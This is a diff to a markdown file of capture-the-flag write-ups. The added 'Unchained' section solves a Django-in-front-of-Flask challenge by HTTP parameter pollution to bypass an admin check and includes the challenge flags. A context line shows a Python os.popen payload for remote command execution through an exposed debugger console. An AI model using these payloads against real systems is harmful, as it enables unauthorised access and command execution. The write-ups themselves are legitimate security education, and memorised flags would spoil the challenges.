@@ -16,13 +16,99 @@ So going over to `/console` shows the python debugger console but without the pi
 
 We have access to RCE now!!
 
-`__import__('os').popen(<b>cmd</b>).read();`
+`__import__('os').popen(<cmd>).read();`
 
 ## flag 
 
 `ictf{oops_I_left_my_debugger_on_I_need_to_run_home_before_my_webserver_burns_down}`
 
 <br>
+
+# Unchained
+
+## Description
+
+I've written so many Flask apps in the past, I thought I'd diversify a bit and try out Django! I wrote this Django app for you guys out of Django and nothing else so don't even bother looking!
+
+## Attachments
+
+`http://puzzler7.imaginaryctf.org:3006`
+
+## Solution
+
+The home page shows the source code of the page written in django
+
+```
+from django.shortcuts import render
+from django.http import HttpResponse, FileResponse
+
+from requests import get
+
+# at /
+def index(request):
+    return HttpResponse(open(__file__, 'r').read(), content_type='text/plain')
+
+# at /flag
+def flag(request):
+    user = request.GET.get('user', '')
+    if user == 'admin':
+        return HttpResponse("Hey, no impersonating admin!")
+    url = request.build_absolute_uri().replace(request.build_absolute_uri('/'), '')
+    r = get('http://0.0.0.0:1337/'+url)
+    return HttpResponse(r.content)
+
+# definitely not at /nothing_important_dont_look_here
+def nothing_important_dont_look_here(request):
+    return HttpResponse(get('http://0.0.0.0:1337').content, content_type='text/plain')
+```
+
+There is nothing in here that shows the flag.
+
+But going over to `/nothing_important_dont_look_here` shows flask code!!
+
+```
+#!/usr/bin/env python3
+
+from flask import Flask, Response, request
+
+app = Flask(__name__)
+
+# Ah, heck, you got me. It's been Flask the whole time!
+
+@app.route('/')
+def index():
+    return Response(open(__file__).read(), mimetype='text/plain')
+
+@app.route('/flag')
+def flag():
+    if 'user' not in request.args:
+        return "User not logged in!"
+    if request.args['user'] != 'admin':
+        return "User is not admin!"
+    return f"Welcome, {request.args['user']}! The flag is {open('flag.txt').read()}"
+    
+app.run('0.0.0.0', 1337)
+```
+
+If we pass the user parameter to be `admin`, we get the flag. But the issue here is that if the user is set to be admin, django filters it out..🤯
+
+After extensive search it was found that this can be achieved by [HTTP Parameter Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).
+
+Here django interprets the last occurence of the parameter, whereas flask interprets first occurence.
+
+So simply this url gives the flag.
+
+```
+http://puzzler7.imaginaryctf.org:3006/flag?user=admin&user=admi
+```
+
+## flag
+
+`ictf{only_accessible_by_schroedinger's_admin}`
+
+<br>
+
+
 
 # Replacement
 
